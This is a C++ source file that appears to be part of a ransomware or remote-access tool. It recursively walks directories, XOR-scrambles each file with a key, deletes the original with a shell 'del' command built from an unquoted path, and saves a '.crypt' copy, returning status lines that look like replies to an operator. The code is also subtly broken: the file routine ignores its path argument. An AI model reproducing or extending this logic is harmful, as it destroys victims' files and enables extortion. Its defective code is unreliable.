#include <string>
#include <fstream>
#include <vector>
#include <windows.h>

#include "Utils.h"

std::string readFile(const std::string fileName) {
	std::ifstream file(fileName, std::ios::binary);
	file.seekg(0, std::ios::end);
	std::streamoff size = file.tellg();
	std::string s(size, ' ');
	file.seekg(0);
	file.read(&s[0], size);
	return s;
}

std::string CryptFile(std::string path, int key) {
	std::string n_path;
	TreatmentPath(n_path);

	if (n_path[n_path.size() - 1] == '\\') n_path.pop_back();

	try {
		std::string data = readFile(n_path), delcmd = "del " + n_path, cryptdata;
		for (size_t item = 0; item < data.length(); ++item)
			cryptdata += data[item] ^ key;

		system(delcmd.c_str());
		std::ofstream crfile(n_path + ".crypt");
		for (size_t item = 0; item < cryptdata.length(); ++item)
			crfile << cryptdata[item];

		crfile.close();
		return "crypt " + n_path + " ok\n";
	}
	catch (...) {
		return "crypt " + n_path + " failed\n";
	}
}

std::string CryptDir(std::string path, int key) {
	std::string buf;
	std::vector<std::string> v;

	TreatmentPath(path);

	if (path[path.size()-1] != '\\') path += "\\";

	v = scandir(path + "*");
	if (v.size() < 1) return "Directory exist\n";

	for (unsigned int i = 0; i < v.size(); i++)
		if (dirExists(path + v[i])) CryptDir(path + v[i], key);
		else buf += CryptFile(path + v[i], key);

	return buf;
}